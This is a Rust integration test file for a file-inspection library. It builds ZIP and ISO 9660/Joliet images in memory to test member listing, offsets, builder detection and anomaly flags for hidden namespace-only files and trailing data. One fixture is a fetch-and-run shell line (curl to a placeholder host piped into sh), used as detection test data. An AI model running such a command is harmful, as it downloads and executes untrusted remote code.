//! End-to-end tests of archives and disc images, built in memory so no
//! binary fixture is needed.
//!
//! Tests that read more than one view assert the no-duplicate-work
//! guarantee (`parse_count() == 1` once those views have been read).
#![allow(
    clippy::cast_possible_truncation,
    clippy::cast_possible_wrap,
    clippy::cast_sign_loss,
    clippy::cast_lossless,
    clippy::float_cmp,
    reason = "fixtures build binary layouts from literals and compare exact expected values"
)]

mod common;

use common::iso::{self, SECTOR, both16, both32, dir_record};
use common::{open, options};
use filefacts::FileType;

/// The recording date every synthetic directory record carries: 2026-03-23
/// 17:30:20, UTC+02:00.
const RECORDED: [u8; 7] = [126, 3, 23, 17, 30, 20, 8];

#[test]
fn zip_archive_emits_member_listing_and_aggregates() {
    // Hand-build a minimal ZIP with three regular-file entries so we
    // don't depend on an external fixture for an integration test.
    let bytes = build_minimal_zip();
    let parsed = open(&bytes);
    assert_eq!(parsed.fileid().file_type(), FileType::Zip);

    let values = parsed.values();
    let metrics = parsed.metrics();

    let members = values
        .get("archive.members")
        .and_then(|v| v.as_array())
        .expect("archive.members should be present");
    assert_eq!(members.len(), 3);
    for member in members {
        let header_offset = member
            .get("header_offset")
            .and_then(serde_json::Value::as_u64)
            .expect("zip member header_offset");
        let data_offset = member
            .get("data_offset")
            .and_then(serde_json::Value::as_u64)
            .expect("zip member data_offset");
        let central_header_offset = member
            .get("central_header_offset")
            .and_then(serde_json::Value::as_u64)
            .expect("zip member central_header_offset");
        assert!(data_offset > header_offset);
        assert!(central_header_offset > data_offset);
        assert!(
            member
                .get("crc32")
                .and_then(serde_json::Value::as_u64)
                .is_some()
        );
    }

    let typed_members = parsed.archive_members();
    assert_eq!(typed_members.len(), members.len());
    for (typed, member) in typed_members.iter().zip(members) {
        assert_eq!(
            member.get("path").and_then(serde_json::Value::as_str),
            Some(typed.path.as_str())
        );
        assert_eq!(
            member
                .get("header_offset")
                .and_then(serde_json::Value::as_u64),
            typed.offsets.header
        );
        assert_eq!(
            member
                .get("data_offset")
                .and_then(serde_json::Value::as_u64),
            typed.offsets.data
        );
        assert_eq!(
            member
                .get("central_header_offset")
                .and_then(serde_json::Value::as_u64),
            typed.offsets.central_header
        );
        assert_eq!(
            member.get("crc32").and_then(serde_json::Value::as_u64),
            typed.crc32.map(u64::from)
        );
    }

    assert_eq!(metrics.get("archive.member_count"), Some(3.0));
    assert!(metrics.get("file.entropy").is_some());

    assert_eq!(parsed.parse_count(), 1);
}

/// Build a minimal ZIP containing three regular-file entries with
/// distinct paths. Pure-Rust, no external test fixture required.
fn build_minimal_zip() -> Vec<u8> {
    use std::io::Write;
    use zip::write::SimpleFileOptions;
    let mut buf = Vec::new();
    let cursor = std::io::Cursor::new(&mut buf);
    let mut writer = zip::ZipWriter::new(cursor);
    let options = SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);

    writer.start_file("a.txt", options).unwrap();
    writer.write_all(b"alpha\n").unwrap();
    writer.start_file("dir/b.txt", options).unwrap();
    writer.write_all(b"beta\n").unwrap();
    writer.start_file("dir/c.txt", options).unwrap();
    writer.write_all(b"gamma\n").unwrap();
    writer.finish().unwrap();
    buf
}

// ---------------------------------------------------------------------------
// Optical-disc images
// ---------------------------------------------------------------------------

/// Build a minimal but conforming ISO 9660 image with an optional Joliet
/// namespace, in pure Rust so no binary fixture is needed.
///
/// Layout (2048-byte sectors): 16 reserved, then PVD, Joliet SVD, terminator,
/// both path tables, the ISO 9660 root extent, the Joliet root extent, then
/// one sector of file data per member.
///
/// `joliet_only` members appear in the Joliet directory tree and *not* in the
/// ISO 9660 one — the namespace-divergence case a reader that follows a
/// single tree cannot see.
fn build_minimal_iso(
    files: &[(&str, &str, &[u8])],
    joliet_only: &[(&str, &[u8])],
    application_id: &str,
    trailing: &[u8],
) -> Vec<u8> {
    fn pad(mut v: Vec<u8>, n: usize) -> Vec<u8> {
        v.resize(n, 0);
        v
    }
    fn astr(s: &str, n: usize) -> Vec<u8> {
        let mut v = s.as_bytes().to_vec();
        v.resize(n, b' ');
        v
    }
    fn ucs2(s: &str) -> Vec<u8> {
        s.encode_utf16().flat_map(u16::to_be_bytes).collect()
    }

    fn volume_descriptor(
        kind: u8,
        root_lba: u32,
        total_sectors: u32,
        joliet: bool,
        application_id: &str,
        path_lba: u32,
    ) -> Vec<u8> {
        let mut v = vec![kind];
        v.extend_from_slice(b"CD001");
        v.push(1); // descriptor version
        v.push(0); // unused
        v.extend(vec![0_u8; 32]); // system identifier
        v.extend(if joliet {
            pad(ucs2("TESTVOL"), 32)
        } else {
            astr("TESTVOL", 32)
        });
        v.extend(vec![0_u8; 8]);
        v.extend(both32(total_sectors));
        // Escape sequences: `%/E` selects Joliet UCS-2 level 3.
        v.extend(if joliet {
            pad(b"%/E".to_vec(), 32)
        } else {
            vec![0_u8; 32]
        });
        v.extend(both16(1)); // volume set size
        v.extend(both16(1)); // volume sequence number
        v.extend(both16(SECTOR as u16));
        v.extend(both32(10)); // path table size
        v.extend(path_lba.to_le_bytes());
        v.extend(0_u32.to_le_bytes());
        v.extend((path_lba + 1).to_be_bytes());
        v.extend(0_u32.to_be_bytes());
        v.extend(dir_record(
            &[0],
            root_lba,
            SECTOR as u32,
            0x02,
            RECORDED,
            &[],
        ));
        let mut v = pad(v, 190);
        v.extend(if joliet {
            pad(ucs2(""), 128)
        } else {
            astr("", 128)
        }); // volume set identifier
        v.extend(astr("", 128)); // publisher
        v.extend(astr("", 128)); // data preparer
        v.extend(astr(application_id, 128));
        v.extend(astr("", 37 * 3)); // copyright / abstract / bibliographic
        v.extend(b"2026032317321065");
        v.push(8);
        v.extend(b"2026032317321065");
        v.push(8);
        v.extend(vec![b'0'; 16]);
        v.push(0);
        v.extend(vec![b'0'; 16]);
        v.push(0);
        v.push(1); // file structure version
        pad(v, SECTOR)
    }

    // Sector plan.
    let pvd_lba = 16_u32;
    let svd_lba = 17_u32;
    let term_lba = 18_u32;
    let path_lba = 19_u32;
    let root_lba = 21_u32;
    let jroot_lba = 22_u32;
    let mut next = 23_u32;
    let placed: Vec<(&str, &str, &[u8], u32)> = files
        .iter()
        .map(|(iso, jol, body)| {
            let lba = next;
            next += (body.len().div_ceil(SECTOR)).max(1) as u32;
            (*iso, *jol, *body, lba)
        })
        .collect();
    let jonly: Vec<(&str, &[u8], u32)> = joliet_only
        .iter()
        .map(|(jol, body)| {
            let lba = next;
            next += (body.len().div_ceil(SECTOR)).max(1) as u32;
            (*jol, *body, lba)
        })
        .collect();
    let total = next;

    let mut img = vec![0_u8; total as usize * SECTOR];
    let mut put = |lba: u32, blob: &[u8]| iso::put(&mut img, lba as usize * SECTOR, blob);

    put(
        pvd_lba,
        &volume_descriptor(1, root_lba, total, false, application_id, path_lba),
    );
    put(
        svd_lba,
        &volume_descriptor(2, jroot_lba, total, true, application_id, path_lba),
    );
    put(
        term_lba,
        &pad([&[255_u8][..], b"CD001", &[1]].concat(), SECTOR),
    );

    // Path tables: one record naming the root directory, L then M.
    let mut lpt = vec![1_u8, 0];
    lpt.extend(root_lba.to_le_bytes());
    lpt.extend(1_u16.to_le_bytes());
    lpt.extend([0, 0]);
    put(path_lba, &pad(lpt, SECTOR));
    let mut mpt = vec![1_u8, 0];
    mpt.extend(root_lba.to_be_bytes());
    mpt.extend(1_u16.to_be_bytes());
    mpt.extend([0, 0]);
    put(path_lba + 1, &pad(mpt, SECTOR));

    // ISO 9660 root: `.`, `..`, then the shared members under their 8.3 names.
    let mut iso_root = dir_record(&[0], root_lba, SECTOR as u32, 0x02, RECORDED, &[]);
    iso_root.extend(dir_record(
        &[1],
        root_lba,
        SECTOR as u32,
        0x02,
        RECORDED,
        &[],
    ));
    for (iso_name, _, body, lba) in &placed {
        iso_root.extend(dir_record(
            format!("{iso_name};1").as_bytes(),
            *lba,
            body.len() as u32,
            0,
            RECORDED,
            &[],
        ));
    }
    put(root_lba, &pad(iso_root, SECTOR));

    // Joliet root: the same members under their long names, plus any member
    // that exists in this namespace alone.
    let mut jol_root = dir_record(&[0], jroot_lba, SECTOR as u32, 0x02, RECORDED, &[]);
    jol_root.extend(dir_record(
        &[1],
        jroot_lba,
        SECTOR as u32,
        0x02,
        RECORDED,
        &[],
    ));
    for (_, jol_name, body, lba) in &placed {
        jol_root.extend(dir_record(
            &ucs2(&format!("{jol_name};1")),
            *lba,
            body.len() as u32,
            0,
            RECORDED,
            &[],
        ));
    }
    for (jol_name, body, lba) in &jonly {
        jol_root.extend(dir_record(
            &ucs2(&format!("{jol_name};1")),
            *lba,
            body.len() as u32,
            0,
            RECORDED,
            &[],
        ));
    }
    put(jroot_lba, &pad(jol_root, SECTOR));

    for (_, _, body, lba) in &placed {
        put(*lba, body);
    }
    for (_, body, lba) in &jonly {
        put(*lba, body);
    }
    img.extend_from_slice(trailing);
    img
}

/// An ISO member is a verbatim run of sectors, so filefacts reports it with
/// the byte offset a caller can slice directly — no decompression involved.
/// The long Joliet name wins over the 8.3 ISO 9660 one, because that is the
/// name the mounting OS shows.
#[test]
fn iso_members_carry_sliceable_extents_and_joliet_names() {
    let iso = build_minimal_iso(
        &[
            ("INSTALL0", "Installer_x64.exe", b"MZ\x90\x00setup"),
            ("README", "ReadMe.txt", b"hello\n"),
        ],
        &[],
        "IMGBURN V2.5.8.0 - THE ULTIMATE IMAGE BURNER!",
        b"",
    );
    let parsed = options().path(std::path::Path::new("d.iso")).open(&iso);
    assert_eq!(parsed.fileid().file_type(), FileType::Iso);

    let members = parsed.archive_members();
    let names: Vec<&str> = members.iter().map(|m| m.path.as_str()).collect();
    assert_eq!(names, vec!["Installer_x64.exe", "ReadMe.txt"]);

    let installer = &members[0];
    assert_eq!(installer.size_bytes, 9);
    let offset = installer
        .offsets
        .data
        .expect("contiguous member has an offset");
    assert_eq!(
        &iso[offset as usize..offset as usize + 9],
        b"MZ\x90\x00setup"
    );
    // Stored verbatim: no per-member codec to report.
    assert_eq!(
        installer.compression,
        filefacts::ArchiveCompression::default()
    );

    let v = parsed.values();
    assert_eq!(
        v.get("iso.format").and_then(|x| x.as_str()),
        Some("iso9660")
    );
    assert_eq!(
        v.get("iso.volume_id").and_then(|x| x.as_str()),
        Some("TESTVOL")
    );
    // The mastering tool is recovered from the PVD application identifier.
    assert_eq!(
        v.get("iso.builder").and_then(|x| x.as_str()),
        Some("imgburn")
    );
    assert_eq!(parsed.metrics().get("iso.file_count"), Some(2.0));
    assert_eq!(parsed.metrics().get("iso.executable_file_count"), Some(1.0));
    assert_eq!(parsed.parse_count(), 1);
}

/// ISO 9660 and Joliet are independent directory trees over the same sectors.
/// A member listed in only one of them is invisible to a reader that follows
/// the other, so both are walked and the results unioned by extent.
#[test]
fn iso_member_present_in_one_namespace_only_is_still_surfaced() {
    let iso = build_minimal_iso(
        &[("README", "ReadMe.txt", b"nothing to see\n")],
        &[("invoice.exe", b"MZ\x90\x00payload")],
        "",
        b"",
    );
    let parsed = options().path(std::path::Path::new("d.iso")).open(&iso);

    let names: Vec<&str> = parsed
        .archive_members()
        .iter()
        .map(|m| m.path.as_str())
        .collect();
    assert!(
        names.contains(&"invoice.exe"),
        "Joliet-only member must survive the union: {names:?}"
    );

    let anomalies = parsed
        .values()
        .get("iso.anomalies")
        .cloned()
        .unwrap_or_default();
    let anomalies: Vec<&str> = anomalies.as_array().map_or(Vec::new(), |a| {
        a.iter().filter_map(|x| x.as_str()).collect()
    });
    assert!(
        anomalies.contains(&"tree-only-file"),
        "divergence is itself the finding: {anomalies:?}"
    );
    // No mastering tool stamped any identifier field.
    assert_eq!(
        parsed.metrics().get("iso.blank_identifier_count"),
        Some(5.0)
    );
    assert_eq!(parsed.parse_count(), 1);
}

/// Bytes past the volume the descriptors declare belong to no file, so a walk
/// of the directory tree never reaches them. They are reported as an
/// unclaimed region with an offset, which is what lets a caller analyse them.
#[test]
fn iso_trailing_data_is_reported_as_an_unclaimed_member() {
    let payload = b"#!/bin/sh\ncurl http://example.invalid/x | sh\n";
    let iso = build_minimal_iso(&[("README", "ReadMe.txt", b"clean\n")], &[], "", payload);
    let parsed = options().path(std::path::Path::new("d.iso")).open(&iso);

    assert_eq!(
        parsed.metrics().get("iso.trailing_bytes"),
        Some(payload.len() as f64)
    );
    let trailing = parsed
        .archive_members()
        .iter()
        .find(|m| m.entry_type == filefacts::EntryType::Trailing)
        .cloned()
        .expect("trailing region is surfaced as a member");
    let offset = trailing
        .offsets
        .data
        .expect("trailing region is addressable") as usize;
    assert_eq!(&iso[offset..offset + payload.len()], payload);

    let anomalies = parsed
        .values()
        .get("iso.anomalies")
        .cloned()
        .unwrap_or_default();
    let anomalies: Vec<&str> = anomalies.as_array().map_or(Vec::new(), |a| {
        a.iter().filter_map(|x| x.as_str()).collect()
    });
    assert!(anomalies.contains(&"trailing-data"), "{anomalies:?}");
    assert_eq!(parsed.parse_count(), 1);
}

/// A well-formed image has no unclaimed interior space: the descriptors, path
/// tables, directory extents and file extents account for every sector. This
/// is the false-positive guard for the slack reporting above.
#[test]
fn iso_without_hidden_space_reports_no_slack() {
    let iso = build_minimal_iso(
        &[("README", "ReadMe.txt", b"clean\n")],
        &[],
        "MKISOFS ISO 9660/HFS FILESYSTEM BUILDER",
        b"",
    );
    let parsed = options().path(std::path::Path::new("d.iso")).open(&iso);
    assert_eq!(parsed.metrics().get("iso.unallocated_bytes"), Some(0.0));
    assert_eq!(
        parsed.metrics().get("iso.unclaimed_region_count"),
        Some(0.0)
    );
    assert_eq!(
        parsed.values().get("iso.builder").and_then(|x| x.as_str()),
        Some("mkisofs")
    );
    assert_eq!(parsed.parse_count(), 1);
}
